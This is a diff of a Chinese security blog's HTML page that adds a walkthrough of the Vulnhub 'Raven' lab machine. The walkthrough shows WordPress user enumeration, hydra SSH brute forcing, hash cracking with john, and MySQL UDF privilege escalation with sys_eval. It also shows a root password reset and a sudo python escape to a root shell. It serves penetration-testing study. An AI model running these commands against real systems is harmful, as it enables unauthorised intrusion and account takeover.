@@ -6,15 +6,31 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>owefsad&#39;s blog</title>
+  <title>Vulnhub Challenging: Raven | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="owefsad&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="思路 拿到靶机，端口扫描 80端口，查找WEB漏洞 wordpress框架，枚举、爆破、搜cve 22端口，ssh爆破 mysql服务，爆破、拖库、UDF提权 拿到hash，john爆破 sudo -l，root执行后逃逸提权">
+<meta name="keywords" content="wordpress爆破,ssh爆破,udf提权,sudoers配置错误">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub Challenging: Raven">
+<meta property="og:url" content="http://yoursite.com/2018/12/08/Vulnhub-Challenging-Raven/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
+<meta property="og:description" content="思路 拿到靶机，端口扫描 80端口，查找WEB漏洞 wordpress框架，枚举、爆破、搜cve 22端口，ssh爆破 mysql服务，爆破、拖库、UDF提权 拿到hash，john爆破 sudo -l，root执行后逃逸提权">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://i1.bvimg.com/671004/811f2f53af482938.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/ae573c28a23defa1.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/17d4c06d3229bd74.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/c431b8306304db05.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/e12109195e0c000f.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/fdab805f9a32038e.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/b2c89bbfdc5f84f9.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/1b2167602e4efc0f.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/872511302b76108c.png">
+<meta property="og:image" content="http://i1.bvimg.com/671004/98579fede17c3d4a.png">
+<meta property="og:updated_time" content="2018-12-08T02:30:13.400Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="owefsad&#39;s blog">
+<meta name="twitter:title" content="Vulnhub Challenging: Raven">
+<meta name="twitter:description" content="思路 拿到靶机，端口扫描 80端口，查找WEB漏洞 wordpress框架，枚举、爆破、搜cve 22端口，ssh爆破 mysql服务，爆破、拖库、UDF提权 拿到hash，john爆破 sudo -l，root执行后逃逸提权">
+<meta name="twitter:image" content="http://i1.bvimg.com/671004/811f2f53af482938.png">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -164,104 +180,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-hexo-install" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+            <article id="post-Vulnhub-Challenging-Raven" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/08/hexo-install/">Hexo搭建个人博客</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/08/hexo-install/" class="archive-article-date">
-  	<time datetime="2018-12-08T02:30:13.419Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Hexo安装与配置"><a href="#Hexo安装与配置" class="headerlink" title="Hexo安装与配置"></a>Hexo安装与配置</h2>
-        
-          <a class="article-more-a" href="/2018/12/08/hexo-install/#more">read all >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/hexo//" class="article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/08/hexo-install/">查看全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Vulnhub-Challenging-Raven" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/08/Vulnhub-Challenging-Raven/">Vulnhub Challenging: Raven</a>
+    <h1 class="article-title" itemprop="name">
+      Vulnhub Challenging: Raven
     </h1>
   
 
@@ -281,14 +207,56 @@
 <li>22端口，ssh爆破</li>
 <li>mysql服务，爆破、拖库、UDF提权</li>
 <li>拿到hash，john爆破</li>
-<li>sudo -l，root执行后逃逸提权
-        
-          <a class="article-more-a" href="/2018/12/08/Vulnhub-Challenging-Raven/#more">read all >></a>
-        
+<li>sudo -l，root执行后逃逸提权<a id="more"></a>
+</li>
+</ul>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -A -p- 10.129.10.32</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/811f2f53af482938.png" alt="端口扫描结果"><br>发现22、80、111三个端口,111端口中的rpcbind和status服务都不可利用,直接放弃; 22端口无直接漏洞,待定; 矛头指向80端口.</p>
+<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><p>使用浏览器访问80端口, 发现wordpress目录和flag1; 用<code>dirb</code>扫目录,发现<code>/wordpress/wp-content</code>、<code>wordpress/wp-admin</code>、<code>wordpress/include</code>目录;<br>开启<code>wpscan</code>枚举用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wpscan --url http://10.129.10.32/wordpress --wp-content-dir wp-content --enumerate u</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/ae573c28a23defa1.png" alt="wpscan"></p>
+<p>枚举之后发现两个用户：michael、steven. 查找wordpress登陆接口无果，决定用两个账号爆破ssh.</p>
+<h3 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hydra -l michael -P /usr/share/wordlists/rockyou.txt -e nsr ssh://10.129.10.32</span><br></pre></td></tr></table></figure>
+<p>发现密码：michael, steven账户爆破30分钟未果, 于是放弃.</p>
+<h3 id="进shell-搜信息"><a href="#进shell-搜信息" class="headerlink" title="进shell, 搜信息"></a>进shell, 搜信息</h3><p>进入shell后, 直接上传linux枚举脚本：LinEnum.sh 查看是否有可利用的地方<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x LinEnum.sh</span><br><span class="line">$ ./LinEnum.sh</span><br></pre></td></tr></table></figure></p>
+<p>内核3.16.0, 无提权漏洞; 操作系统debian 8, 无提权漏洞; michael无可用sudo执行的命令; crontab无用户自定义文件; 发现mysql服务且以root权限启动, 列入首要考虑范围; 其他文件、服务均无明显问题, 遂尝试mysql; 由于存在WEB站点, 因此到站点目录下搜索配置文件, 发现wp-config.php文件, 内容如下:<br><img src="http://i1.bvimg.com/671004/17d4c06d3229bd74.png" alt="wp-content.php"><br>发现mysql数据库密码: <code>R@v3nSecurity</code></p>
+<h3 id="mysql服务-读库-udf提权"><a href="#mysql服务-读库-udf提权" class="headerlink" title="mysql服务, 读库, udf提权"></a>mysql服务, 读库, udf提权</h3><h4 id="读库-破解hash"><a href="#读库-破解hash" class="headerlink" title="读库, 破解hash"></a>读库, 破解hash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/c431b8306304db05.png" alt="show databases"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/e12109195e0c000f.png" alt="show tables"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from wp_users;</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/fdab805f9a32038e.png" alt="wp_users data"><br>发现michael、steven用户的密码哈希值, 用john爆破<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim hash.txt <span class="comment">#复制steven的密码哈希到文件中</span></span><br><span class="line">$ john hash.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i1.bvimg.com/671004/b2c89bbfdc5f84f9.png" alt="Markdown"></p>
+<h4 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看mysql插件地址</span></span><br><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传udf.so文件到plugin_dir目录中</span></span><br><span class="line">mysql&gt; create table a (cmd LONGBLOB);</span><br><span class="line">mysql&gt; insert into a (cmd) values (hex(load_file(<span class="string">'/tmp/udf.so'</span>)));</span><br><span class="line">mysql&gt; SELECT unhex(cmd) FROM a INTO DUMPFILE <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建函数sys_eval</span></span><br><span class="line">mysql&gt;  CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="string">'udf.so'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断权限</span></span><br><span class="line">mysql&gt; select sys_eval(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="http://i1.bvimg.com/671004/1b2167602e4efc0f.png" alt="Markdown"></p>
+<p>修改root密码，拿权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sys_eval(<span class="string">'(echo "xxxxxxxx";sleep 1;echo "xxxxxxxx")|passwd &gt; /dev/null'</span>);</span><br></pre></td></tr></table></figure></p>
+<h3 id="sudoers文件配置有误导致提权"><a href="#sudoers文件配置有误导致提权" class="headerlink" title="sudoers文件配置有误导致提权"></a>sudoers文件配置有误导致提权</h3><p>shell下登陆steven账户, 运行LinEnum.sh后发现可用sudo执行python命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /bin/usr/python</span><br><span class="line"><span class="comment"># 直接修改root密码</span></span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(<span class="string">'(echo "xxxxxxxx";sleep 1;echo "xxxxxxxx")|passwd &gt; /dev/null'</span>)</span><br><span class="line"><span class="comment"># 通过pty运行子程序bash</span></span><br><span class="line">&gt;&gt;&gt; import pty</span><br><span class="line">&gt;&gt;&gt; pty.spawn(<span class="string">"bash"</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="拿到3个flag"><a href="#拿到3个flag" class="headerlink" title="拿到3个flag"></a>拿到3个flag</h3><p>靶机说明中表示有4个flag, 但是查看root目录中.bash_history后发现某人执行了命令<code>mv flag3.txt flag4.txt</code>, 因此未发现flag3<br><img src="http://i1.bvimg.com/671004/872511302b76108c.png" alt="Markdown"><br><img src="http://i1.bvimg.com/671004/98579fede17c3d4a.png" alt="Markdown"></p>
+
       
 
       
-    </li></ul></div>
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
     <div class="article-info article-info-index">
       
       
@@ -329,16 +297,84 @@
 
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/08/Vulnhub-Challenging-Raven/">查看全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/12/08/Vulnhub-Challenging-Raven/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2018/12/08/hexo-install/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Hexo搭建个人博客
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/12/07/Vulnhub-Wakanda/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Vulnhub Wakanda 1</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -358,108 +394,14 @@
 
 
 
-
   
-    <article id="post-Vulnhub-Wakanda" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/07/Vulnhub-Wakanda/">Vulnhub Wakanda 1</a>
-    </h1>
   
 
-        
-        <a href="/2018/12/07/Vulnhub-Wakanda/" class="archive-article-date">
-  	<time datetime="2018-12-07T11:53:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
-<li>端口扫描, 整理思路</li>
-<li>80端口, 文件包含</li>
-<li>3333端口, 逃逸python</li>
-<li>devops, 服务提权</li>
-<li>sudo -l, 成功通关
-        
-          <a class="article-more-a" href="/2018/12/07/Vulnhub-Wakanda/#more">read all >></a>
-        
-      
-
-      
-    </li></ul></div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件包含</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pip提权</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">服务提权</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/ctf//" class="article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/07/Vulnhub-Wakanda/">查看全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
+  
 
   
+
   
 
 
@@ -482,8 +424,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
